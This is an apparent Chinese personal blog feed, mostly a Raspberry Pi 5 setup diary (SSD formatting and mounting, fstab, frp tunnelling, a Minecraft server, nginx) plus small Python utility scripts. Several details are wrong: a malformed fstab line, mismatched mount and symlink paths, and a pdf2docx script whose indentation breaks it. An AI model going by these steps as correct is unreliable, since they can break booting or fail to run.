<p><strong>命令行参数</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;argc = %d\n&quot;</span>, argc);</span><br><span class="line">    <span class="comment">// 循环打印argv数组中的内容</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; argc; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;argv[%d] = %s\n&quot;</span>, i, argv[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/09/21/ms/image-20240921194356442.png" alt="image-20240921194356442" style="zoom:50%;">

<p><strong>argc</strong>是输入的参数的个数加一，第一个参数是当前进程名，如果是在cmd中执行这个exe：</p>
<img src="/2024/09/21/ms/image-20240921194554141.png" alt="image-20240921194554141" style="zoom:50%;">

]]></content>
  </entry>
  <entry>
    <title>捣鼓一块Raspberry Pi 5</title>
    <url>/2024/11/23/raspberrypi/</url>
    <content><![CDATA[<p>之前一直弄Kali，Ubuntu，aliyunECS之类的，想搞一块本地的玩玩，整了块Raspberry Pi 5</p>
<span id="more"></span>

<p><strong>思路：从tf卡启动系统，ssd作为存储盘，使用先电脑热点和XTerminal连接，系统使用Raspberry Pi OS Lite（后来发现Ubuntu不好使），然后使用Sakura frp内网穿透实现公网访问</strong></p>
<h1 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h1><h2 id="树莓派5"><a href="#树莓派5" class="headerlink" title="树莓派5"></a>树莓派5</h2><p>首先就是一块Raspberry 5，规格是4核8G。</p>
<img src="/2024/11/23/raspberrypi/image-20241123212605050.png" alt="image-20241123212605050" style="zoom:50%;">

<p><img src="/2024/11/23/raspberrypi/image-20241123212614501.png" alt="image-20241123212614501" style="zoom:50%;">		<img src="/2024/11/23/raspberrypi/image-20241123212623530.png" alt="image-20241123212623530" style="zoom:50%;"></p>
<p>板子还挺好看</p>
<h2 id="SSD硬盘"><a href="#SSD硬盘" class="headerlink" title="SSD硬盘"></a>SSD硬盘</h2><p>买了一块戴尔的拆机硬盘 M.2 2230规格，128G花了68米</p>
<h2 id="PCle-to-M-2"><a href="#PCle-to-M-2" class="headerlink" title="PCle to M.2"></a>PCle to M.2</h2><p>用的微雪的PCle to M.2 MINI转接板，下图安装2230尺寸SSD时，需要使用铜柱和小螺丝把SSD固定住（捣鼓了半天没搞清楚怎么弄）</p>
<img src="/2024/11/23/raspberrypi/image-20241123212633836.png" alt="image-20241123212633836" style="zoom:50%;">

<h2 id="风扇"><a href="#风扇" class="headerlink" title="风扇"></a>风扇</h2><p>风扇用的是国产的小风扇，13.9米，运行起来也没有声音，还不错</p>
<p>但是感觉到60度才开始降温有点不行，后面尝试调教一下</p>
<h1 id="系统准备"><a href="#系统准备" class="headerlink" title="系统准备"></a>系统准备</h1><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p>在这个网站<a href="https://ubuntu.com/download/raspberry-pi">Install Ubuntu on a Raspberry Pi | Ubuntu</a>，下载的是<code>ubuntu-24.04.1-preinstalled-server-arm64+raspi.img.xz</code>这个文件</p>
<img src="/2024/11/23/raspberrypi/image-20241123110041657.png" alt="image-20241123110041657" style="zoom:55%;">

<h2 id="烧录器"><a href="#烧录器" class="headerlink" title="烧录器"></a>烧录器</h2><p>在这里<a href="https://www.raspberrypi.com/software/">Raspberry Pi OS – Raspberry Pi</a>下载烧录器</p>
<img src="/2024/11/23/raspberrypi/image-20241123110310397.png" alt="image-20241123110310397" style="zoom:40%;">

<h2 id="烧录"><a href="#烧录" class="headerlink" title="烧录"></a>烧录</h2><blockquote>
<p>小坑：刚下载的Ubuntu系统，烧录完之后，没有network config之类的配置，所以使用树莓派烧录器，能够在烧录之前配置好启动后需要如何连接树莓派</p>
</blockquote>
<p>首先点第一个按钮选Device，我是Raspberry Pi 5所以选第一个</p>
<p><img src="/2024/11/23/raspberrypi/image-20241123110358678.png" alt="image-20241123110358678"></p>
<p>第二个按钮选操作系统，因为已经下载好了，所以划到最下面选 Use custom，然后直接选择刚才下载的.xz文件就可以，选不了的话，用7z解压，然后选解压出来的.img文件</p>
<p><img src="/2024/11/23/raspberrypi/image-20241123110501266.png" alt="image-20241123110501266"></p>
<p>第三个按钮直接选择插入的<strong>空的</strong>tf卡即可。</p>
<p>然后会弹出一个自定义设置，Username和密码设置好一会儿用来连接，配置WiFi的时候建议使用电脑打开热点进行连接</p>
<p><img src="/2024/11/23/raspberrypi/image-20241123160301494.png" alt="image-20241123160301494" style="zoom:36.2%;">   <img src="/2024/11/23/raspberrypi/image-20241123160450294.png" alt="image-20241123160450294" style="zoom:45%;"></p>
<p>第二个页面点击使用密码登录，第三个页面勾选后两个</p>
<p><img src="/2024/11/23/raspberrypi/image-20241123160632935.png" alt="image-20241123160632935" style="zoom:33%;">     <img src="/2024/11/23/raspberrypi/image-20241123160659665.png" alt="image-20241123160659665" style="zoom:33%;">      </p>
<p>然后就可以直接烧录了。</p>
<p>因为我使用了PCle接口接入SSD，所以打开烧录好的tf卡，里面有一个<code>config.txt</code>，在最后添加一行<code>dtparam=pciex1</code>，表示开启PCle接口，不然接口默认是关闭状态</p>
<img src="/2024/11/23/raspberrypi/image-20241123161216127.png" alt="image-20241123161216127" style="zoom:67%;">

<p>因为我不用硬盘启动，所以只是用SSD作为存储盘，所以不用做额外的设置，因此我也没有尝试作为启动盘的设置，如果需要使用SSD作为启动盘，则可以参考这篇文章 </p>
<blockquote>
<p><a href="https://blog.csdn.net/timelockerCSDN/article/details/135793432">树莓派5使用PCIe接口连接NVME M.2固态硬盘SSD_树莓派5 ssd-CSDN博客</a></p>
</blockquote>
<h1 id="开机"><a href="#开机" class="headerlink" title="开机"></a>开机</h1><p>以上的配置都做好了之后，就可以把tf卡拿下来插到树莓派上了</p>
<h2 id="自动连接WiFi"><a href="#自动连接WiFi" class="headerlink" title="自动连接WiFi"></a>自动连接WiFi</h2><p>大概开机1-3分钟左右，树莓派就会自动连接上之前设置的WiFi，因为我是设置的电脑热点，所以很容易看到树莓派在我电脑的局域网内的IP地址</p>
<img src="/2024/11/23/raspberrypi/image-20241123162255840.png" alt="image-20241123162255840" style="zoom:50%;">

<p>如果使用的是手机热点，那么可以将电脑和树莓派都连接到手机的热点，然后使用LanSee等软件扫描一下当前网段内的设备，扫完之后就能看到电脑和树莓派的两个IP地址，但是建议还是使用电脑的热点</p>
<img src="/2024/11/23/raspberrypi/image-20241123162404376.png" alt="image-20241123162404376.png" style="zoom:50%;">

<h2 id="网线连接"><a href="#网线连接" class="headerlink" title="网线连接"></a>网线连接</h2><p>我是先用WiFi连接之后再配的网线，所以需要先连上WiFi</p>
<p><img src="/2024/11/23/raspberrypi/image-20250316172659390.png" alt="image-20250316172659390"></p>
<p>eth0就是有线连接，现在就是需要配置一个静态的IP（打码处）</p>
<h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p>因为我没有买HDMI转接线也没有买树莓派的显示器，所以我使用 Xterminal 连接树莓派，XShell也可，不过些许古老</p>
<p>这样直接用烧录的时候配置的username和密码连接就可以了</p>
<p><img src="/2024/11/23/raspberrypi/image-20241123162912549.png" alt="image-20241123162912549"></p>
<p>进来之后就是这个样子</p>
<p><img src="/2024/11/23/raspberrypi/image-20241123163037779.png" alt="image-20241123163037779"></p>
<h2 id="格式化SSD"><a href="#格式化SSD" class="headerlink" title="格式化SSD"></a>格式化SSD</h2><h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><p>因为买的这个SSD是一块全新的（指还没有格式化，但是拆机，所以还是99新吧），也没有硬盘盒，所以直接在树莓派上格式化一下</p>
<p>首先使用<code>lsblk</code>查看已经连接的所有硬盘，下面这个nvme0n1就是接入的SSD硬盘</p>
<p><strong>因为我这里的SSD硬盘的NAME是这个<code>nvme0n1</code>，所以后面我在格式化的时候使用的是<code>/dev/nvme0n1</code>这个路径，你需要改成你对应的，后面格式化新分区的时候会有一个<code>nvme0n1p1</code>，最后这个<code>p1</code>指的就是第一分区</strong></p>
<p>逻辑解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nvme0n1</span><br></pre></td></tr></table></figure>

<ul>
<li><code>nvme</code> 是表示 NVMe 硬盘的类型。</li>
<li><code>0</code> 是设备编号，表示第一个 NVMe 设备。</li>
<li><code>n1</code> 是表示该设备的分区编号。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p1</span><br></pre></td></tr></table></figure>

<ul>
<li><code>p</code> 是分区的标识符（partition），表示该设备的分区。</li>
<li><code>1</code> 表示第一个分区。</li>
</ul>
<img src="/2024/11/23/raspberrypi/image-20241123163352421.png" alt="image-20241123163352421" style="zoom: 50%;">

<p>使用<code>sudo fdisk -l</code>可以查看硬盘信息</p>
<img src="/2024/11/23/raspberrypi/image-20241123163543063.png" alt="image-20241123163543063" style="zoom:50%;">

<p>如果要删除所有分区并重新分区，使用<code>gdisk</code>（适用于GPT分区表）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo gdisk /dev/nvme0n1</span><br></pre></td></tr></table></figure>

<ul>
<li>输入<code>d</code>删除分区，按提示操作。</li>
<li>输入<code>w</code>保存更改。</li>
</ul>
<p><strong>↑ ↑ ↑</strong>这一步我没做，因为不需要</p>
<p>创建新分区：</p>
<p>使用<code>gdisk</code>或<code>fdisk</code>来创建新的分区。这里使用<code>gdisk</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo gdisk /dev/nvme0n1</span><br></pre></td></tr></table></figure>

<ul>
<li>输入<code>n</code>新建分区，按照提示输入分区号码和大小。</li>
</ul>
<p>到这里，先输入n，后面我直接使用默认的设置，所以不需要另外输入（红框空的），直接回车使用默认，一直到出现第二次<code>Command (? for help)</code></p>
<p><img src="/2024/11/23/raspberrypi/image-20241123164206796.png" alt="image-20241123164206796"></p>
<p>然后输入 <code>w</code> 保存 ，然后 <code>Y</code> 确认就可以了</p>
<p><img src="/2024/11/23/raspberrypi/image-20241123164335109.png" alt="image-20241123164335109"></p>
<p>到这里是创建了新的分区，还没有格式化新分区</p>
<p>使用以下指令格式化为<code>ext4</code>文件系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkfs.ext4 /dev/nvme0n1p1</span><br></pre></td></tr></table></figure>

<p>当然，也可以格式化成其他文件系统，这里推荐<code>ext4</code>，可以看一下区别</p>
<table>
<thead>
<tr>
<th>文件系统</th>
<th>优势</th>
<th>劣势</th>
</tr>
</thead>
<tbody><tr>
<td>ext4（第四扩展文件系统）</td>
<td>- 稳定性和可靠性较高。<br> - 支持大文件和大容量存储。<br> - 具备日志功能，能够防止数据丢失。<br> - 性能良好，适合大多数Linux环境。</td>
<td>- 与某些非Linux系统的兼容性较差。<br> - 不支持某些现代特性，如快照等。</td>
</tr>
<tr>
<td>XFS</td>
<td>- 对大文件和大容量存储优化良好，适合处理大数据。<br> - 支持实时分配和动态扩展。<br> - 提供高性能和可扩展性。</td>
<td>- 相比于ext4，XFS的文件系统修复较复杂。<br> - 不适合小文件的处理，性能可能较低。</td>
</tr>
<tr>
<td>Btrfs（B-tree文件系统）</td>
<td>- 支持快照、压缩和子卷，适合需要高效存储的场景。<br> - 提供良好的数据完整性和自动纠错功能。<br> - 灵活的管理工具，使得管理非常方便。</td>
<td>- 相比于ext4，成熟度和稳定性稍欠。<br> - 在某些情况下性能可能低于ext4或XFS。</td>
</tr>
<tr>
<td>FAT32</td>
<td>- 兼容性极高，几乎所有操作系统都可以读取。<br> - 适合于小容量的存储设备，如U盘和SD卡。</td>
<td>- 单个文件大小限制为4GB，不适合存储大文件。<br> - 不支持日志功能，数据安全性较低。</td>
</tr>
<tr>
<td>exFAT</td>
<td>- 兼容性强，适合大文件和大容量存储。<br> - 不像FAT32那样有4GB的文件大小限制。</td>
<td>- 数据安全性较差，没有日志功能。<br> - 对于某些Linux系统的原生支持可能较差。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>文件系统</th>
<th>格式化指令</th>
</tr>
</thead>
<tbody><tr>
<td>ext4</td>
<td><code>sudo mkfs.ext4 /dev/nvme0n1p1</code></td>
</tr>
<tr>
<td>XFS</td>
<td><code>sudo mkfs.xfs /dev/nvme0n1p1</code></td>
</tr>
<tr>
<td>Btrfs</td>
<td><code>sudo mkfs.btrfs /dev/nvme0n1p1</code></td>
</tr>
<tr>
<td>FAT32</td>
<td><code>sudo mkfs.vfat /dev/nvme0n1p1</code></td>
</tr>
<tr>
<td>exFAT</td>
<td><code>sudo mkfs.exfat /dev/nvme0n1p1</code></td>
</tr>
</tbody></table>
<p>执行完后，会输出以下指令，然后转接板上的ACT绿灯会闪一会儿</p>
<p><img src="/2024/11/23/raspberrypi/image-20241123165841087.png" alt="image-20241123165841087"></p>
<img src="/2024/11/23/raspberrypi/image-20241123212652362.png" alt="image-20241123212652362" style="zoom:50%;">

<h3 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h3><p>使用 <code>df -h</code> 查看已经有的挂载点，发现硬盘是没有挂载的</p>
<p><img src="/2024/11/23/raspberrypi/image-20241123170138579.png" alt="image-20241123170138579"></p>
<p>使用以下指令创建挂载点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> /mnt/myssd</span><br></pre></td></tr></table></figure>

<p>使用以下指令挂载SSD硬盘，记得将 <code>/dev/nvme0n1p1</code> 改成自己的硬盘</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount /dev/nvme0n1p1 /mnt/myssd</span><br></pre></td></tr></table></figure>

<p><img src="/2024/11/23/raspberrypi/image-20241123170625854.png" alt="image-20241123170625854"></p>
<p>当 <code>/mnt/myssd</code> 路径下出现 <code>lost+found</code> 时，说明创建成功了，再使用 <code>df -h</code> 指令查看，发现已经有了，然后XTerminal右边的监控也显示出来了这块硬盘</p>
<h3 id="开机自动挂载"><a href="#开机自动挂载" class="headerlink" title="开机自动挂载"></a>开机自动挂载</h3><p>如果以上都设置好了是没法开机自动挂载的，如果要在每次启动时自动挂载此分区，可以将分区信息添加到 <code>/etc/fstab</code> 文件中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/fstab</span><br></pre></td></tr></table></figure>

<p>在最后添加一行以下内容，LABEL写不写都行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LABEL=mydata /dev/nvme0n1p1 /mnt/myssd ext4 defaults 0 2</span><br></pre></td></tr></table></figure>

<p>使用标签的主要优点是使配置文件更具可读性和灵活性，特别是在设备名称（如 <code>/dev/nvme0n1p1</code>）可能会变化的情况下</p>
<p>修改完后保存，在使用cat看一下，保证保存成功</p>
<p><img src="/2024/11/23/raspberrypi/image-20241123172427976.png" alt="image-20241123172427976"></p>
<h1 id="到了晚上：WTF？？？"><a href="#到了晚上：WTF？？？" class="headerlink" title="到了晚上：WTF？？？"></a>到了晚上：WTF？？？</h1><p>WTF ？？？连不上WiFi了？？？。。。哦？连上了！啧，，，连不上SSH？？？。。。。。难道能。。了。。吗。。Timeout了？？？</p>
<p>就很离谱，发现连不上ssh，把MicroSD卡拔了插到电脑上，用<a href="https://www.paragon-software.com/home/linuxfs-windows/">Linux File Systems for Windows | Paragon Software (paragon-software.com)</a> 挂载上Linux文件系统，找到了netplan和wpa_suppliant，改了WiFi，还是不行，就很纳闷，过了一会，能连上WiFi了，打开XTerminal还是连不上ssh，显示ERROR ssh失败，又换了手机热点，显示Timeout。。。</p>
<p>由于没有网线，也没有MicroUSB转HDMI接口，索性重新烧了个系统。</p>
<p>还是用的树莓派烧录器，直接在里面选了Raspberry Pi OS Lite（这个系统也是without desktop，占资源少），烧完了之后再插上，发现连上了，而且板子发热也小了很多，果然还是对口的系统优化好一点。并且Raspberry Pi OS Lite网络链接情况比Ubuntu稳定太多。</p>
<p>安装的新系统用起来和Ubuntu没啥区别，反正都是基于Debian，不过还是用不惯vi，一直用vim，vi打开文件敲了一通都不知道文件飞哪去了。。</p>
<h1 id="移动apt目录"><a href="#移动apt目录" class="headerlink" title="移动apt目录"></a>移动apt目录</h1><p><strong>先别移动，往下看看</strong></p>
<p>想把apt的下载目录放到ssd硬盘里面</p>
<p>首先保证apt没有在运行，也就是没有apt的下载进程就可以</p>
<p>先在ssd中创建一个apt文件夹方便管理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /mnt/ssd</span><br><span class="line"><span class="built_in">mkdir</span> apt</span><br></pre></td></tr></table></figure>

<p>然后把当前的缓存目录内容移动到新的SSD目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mv</span> /var/cache/apt/archives /mnt/ssd/apt/archives</span><br></pre></td></tr></table></figure>

<p>创建一个链接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -s /mnt/ssd/archives /var/cache/apt/archives</span><br></pre></td></tr></table></figure>

<p>创建好后在 <code>/var/cache/apt/archives</code> 目录下 <code>ls -l</code> 看到的是这样</p>
<img src="/2024/11/23/raspberrypi/image-20241123205127912.png" alt="image-20241123205127912" style="zoom:50%;">

<div>
<br>
<br>
<br>
<br>
<br>
<div style="display: flex; justify-content: center; color: red; font-size: 18px; font-weight: bold">
    <text>后来发现还是不要移动了，出了点问题，又改回去了QAQ</text>
</div>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
</div>



<h1 id="frpc"><a href="#frpc" class="headerlink" title="frpc"></a>frpc</h1><p>在树莓派上弄一个内网穿透，用的是<a href="https://www.natfrp.com/?page=panel&module=download">Sakura Frp | 樱花内网穿透 </a> </p>
<p>首先看一下<a href="https://doc.natfrp.com/frpc/usage.html">SakuraFrp frpc使用帮助文档</a></p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>首先看一下系统架构</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -m</span><br></pre></td></tr></table></figure>

<img src="/2024/11/23/raspberrypi/image-20241124095330221.png" alt="image-20241124095330221" style="zoom:67%;">

<p>然后使用 <code>wget</code> 下载对应的版本</p>
<p><img src="/2024/11/23/raspberrypi/image-20241124095419276.png" alt="image-20241124095419276"></p>
<p>算一下MD5</p>
<img src="/2024/11/23/raspberrypi/image-20241124095445830.png" alt="image-20241124095445830" style="zoom: 67%;">

<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>没怎么用过linux，我竟然不知道怎么启动哈哈哈哈，是需要加 <code>./xxx</code>，来启动的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x frpc</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./frpc</span><br></pre></td></tr></table></figure>

<p>你别说，这个Sakura frp整的这个TUI还挺高级，应该叫Terminal UI吧</p>
<p><img src="/2024/11/23/raspberrypi/image-20241124124639408.png" alt="image-20241124124639408"></p>
<p>输入秘钥后登录，选择隧道</p>
<p><img src="/2024/11/23/raspberrypi/image-20241124124725810.png" alt="image-20241124124725810"></p>
<p>这样就启动了</p>
<p><img src="/2024/11/23/raspberrypi/image-20241124124753469.png" alt="image-20241124124753469"></p>
<blockquote>
<p>配置开机自启详见<a href="https://doc.natfrp.com/frpc/service/systemd.html">systemd 配置 frpc 服务 | SakuraFrp 帮助文档</a></p>
</blockquote>
<p>因为想van我的世界，所以下一个Java和Spigot用来开服</p>
<h1 id="Minecraft-Server"><a href="#Minecraft-Server" class="headerlink" title="Minecraft Server"></a>Minecraft Server</h1><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>下载jdk21，建议下载jdk17+，我玩的是1.20.1</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://download.oracle.com/java/21/latest/jdk-21_linux-aarch64_bin.tar.gz</span><br></pre></td></tr></table></figure>

<p>然后去 <code>~/.bashrc</code> 配置一下java的环境变量，不会从网上搜搜或者问AI</p>
<h2 id="Spigot"><a href="#Spigot" class="headerlink" title="Spigot"></a>Spigot</h2><p>先开个原版服务器 <a href="https://www.spigotmc.org/">SpigotMC - High Performance Minecraft</a></p>
<p>开服教程去B站搜即可</p>
<h2 id="连接-1"><a href="#连接-1" class="headerlink" title="连接"></a>连接</h2><p>可以看到还是非常流畅的，但是网络延时有点高，到了将近250ms，可能是树莓派连接的电脑热点，电脑又连了手机热点，并且连得还是内网穿透的地址，所以还有待改进，不过整体还算不错，我自己一个人连进去玩，树莓派的风扇都不转，之后试试多人</p>
<div>
    <video width="900" height="520" controls>
          <source src="https://creeeeeeeeeeper.github.io//2024/11/23/raspberrypi/cc.mp4" type="video/mp4">
    </video>
</div>







<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p>先下载Nginx <a href="https://nginx.org/en/download.html">nginx: download</a>，Linux的话下中间这个稳定版就可以了</p>
<p><img src="/2024/11/23/raspberrypi/image-20241125132700880.png" alt="image-20241125132700880"></p>
<p><img src="/2024/11/23/raspberrypi/image-20241125132916949.png" alt="image-20241125132916949"></p>
<p>解压缩一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo tar -zxf nginx-1.26.2.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="/2024/11/23/raspberrypi/image-20241125133145485.png" alt="image-20241125133145485"></p>
<p>然后用以下指令配置Nginx</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure>

<p>中间报了很多错，因为没有一些库，问问AI把这些库下载上就好了</p>
<p>最终配置好出现这个东西：</p>
<p><img src="/2024/11/23/raspberrypi/image-20241125133709574.png" alt="image-20241125133709574"></p>
<p>然后用以下指令编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo make&amp;&amp;sudo make install</span><br></pre></td></tr></table></figure>

<p>编译完之后直接就可以启动了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nginx/sbin/nginx</span><br></pre></td></tr></table></figure>



<img src="/2024/11/23/raspberrypi/image-20241125162749646.png" alt="image-20241125162749646" style="zoom:50%;">

<p>在本地查看一下网页</p>
<p><code>ifconfig</code>看一下局域网内的IP地址</p>
<img src="/2024/11/23/raspberrypi/image-20241125163025047.png" alt="image-20241125163025047" style="zoom:50%;">

<img src="/2024/11/23/raspberrypi/image-20241125163046438.png" alt="image-20241125163046438" style="zoom:30%;">

<p>然后如果在公网访问需要再建一个隧道，用来穿透Nginx的80端口</p>
<p><img src="/2024/11/23/raspberrypi/image-20241125170815139.png" alt="image-20241125170815139"></p>
<p>当然，内网穿透隧道可能会变，导致不能一直访问，有一个解决方法是在github上创建一个page（因为已经有一个github的博客），然后再在这个page的script里面写一个重定向就可以了，如果隧道改了，那么直接在github的page上更新就可以了。不过没有备案的话，访问还是会显示不安全，不过也无伤大雅</p>
]]></content>
  </entry>
  <entry>
    <title>一些没用的python脚本</title>
    <url>/2024/09/21/pythonScripts/</url>
    <content><![CDATA[<h2 id="pdf2docx"><a href="#pdf2docx" class="headerlink" title="pdf2docx"></a>pdf2docx</h2><span id="more"></span>

<h3 id="exe下载"><a href="#exe下载" class="headerlink" title="exe下载"></a>exe下载</h3><p><a href="https://wwuf.lanzouv.com/i5aIU2cqnwri">文件 (lanzouv.com)</a><br>密码:0000</p>
<h3 id="库"><a href="#库" class="headerlink" title="库"></a>库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install pdf2docx</span><br></pre></td></tr></table></figure>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pdf2docx <span class="keyword">import</span> Converter</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pdf_to_word</span>(<span class="params">pdf_file, word_file</span>):</span><br><span class="line">    cv = Converter(pdf_file)</span><br><span class="line">    cv.convert(word_file, start=<span class="number">0</span>, end=<span class="literal">None</span>)</span><br><span class="line">    cv.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;转换完成：<span class="subst">&#123;word_file&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    pdf_file = <span class="string">&#x27;input.pdf&#x27;</span>  <span class="comment"># 替换为 PDF 文件路径</span></span><br><span class="line">    word_file = <span class="string">&#x27;output.docx&#x27;</span>  <span class="comment"># 输出的 Word 文件路径</span></span><br><span class="line"></span><br><span class="line">pdf_to_word(pdf_file, word_file)</span><br></pre></td></tr></table></figure>



<h2 id="按日期整理图片视频"><a href="#按日期整理图片视频" class="headerlink" title="按日期整理图片视频"></a>按日期整理图片视频</h2><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_creation_date</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">return</span> os.path.getmtime(file_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_size</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">return</span> os.path.getsize(file_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">classify_files</span>(<span class="params">source_folder, target_folder</span>):</span><br><span class="line">    file_count = <span class="number">0</span></span><br><span class="line">    total_size = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(source_folder):</span><br><span class="line">        file_path = os.path.join(source_folder, filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(file_path):</span><br><span class="line">            creation_time = get_creation_date(file_path)</span><br><span class="line">            creation_date = datetime.fromtimestamp(creation_time)</span><br><span class="line"></span><br><span class="line">            year = creation_date.strftime(<span class="string">&#x27;%Y&#x27;</span>)</span><br><span class="line">            month = creation_date.strftime(<span class="string">&#x27;%m&#x27;</span>)</span><br><span class="line">            day = creation_date.strftime(<span class="string">&#x27;%d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            target_path = os.path.join(target_folder, year, month, day)</span><br><span class="line">            os.makedirs(target_path, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            file_size = get_file_size(file_path)</span><br><span class="line">            total_size += file_size</span><br><span class="line">            </span><br><span class="line">            shutil.move(file_path, os.path.join(target_path, filename))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;文件 <span class="subst">&#123;filename&#125;</span> 已移动到 <span class="subst">&#123;target_path&#125;</span>&#x27;</span>)</span><br><span class="line">            file_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> file_count, total_size</span><br><span class="line"></span><br><span class="line">source_folder = <span class="string">&#x27;D:/PHOTO&#x27;</span>  <span class="comment"># 替换为你的源文件夹路径</span></span><br><span class="line">target_folder = <span class="string">&#x27;D:/Xiaomi13Photo&#x27;</span>  <span class="comment"># 替换为你的目标文件夹路径</span></span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line">processed_files, total_size = classify_files(source_folder, target_folder)</span><br><span class="line">end_time = time.time()</span><br><span class="line">elapsed_time = end_time - start_time</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;程序运行耗时: <span class="subst">&#123;elapsed_time:<span class="number">.2</span>f&#125;</span> 秒&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> total_size &gt; (<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;共处理了 <span class="subst">&#123;processed_files&#125;</span> 个文件，文件总大小: <span class="subst">&#123;total_size / (<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>):<span class="number">.2</span>f&#125;</span> GB&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;共处理了 <span class="subst">&#123;processed_files&#125;</span> 个文件，文件总大小: <span class="subst">&#123;total_size / (<span class="number">1024</span> * <span class="number">1024</span>):<span class="number">.2</span>f&#125;</span> MB&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>共5789张照片</p>
<p><img src="/2024/09/21/pythonScripts/image-20240921083656995.png" alt="image-20240921083656995"></p>
<p>​            <img src="/2024/09/21/pythonScripts/image-20240921084812939.png" alt="image-20240921084812939" style="zoom:50%;"> <img src="/2024/09/21/pythonScripts/image-20240921084859259.png" alt="image-20240921084859259" style="zoom: 50%;"></p>
